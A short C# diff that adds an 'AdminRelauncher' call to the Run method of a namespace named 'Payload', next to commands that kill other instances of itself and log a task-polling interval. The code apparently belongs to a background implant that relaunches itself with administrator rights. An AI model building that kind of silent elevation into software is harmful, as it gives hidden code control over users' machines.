@@ -45,6 +45,7 @@ namespace Payload
         
         static void Run()
         {
+            new AdminRelauncher();
             new KillOtherMeCommand().Execute();
             OnRelease();
             new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
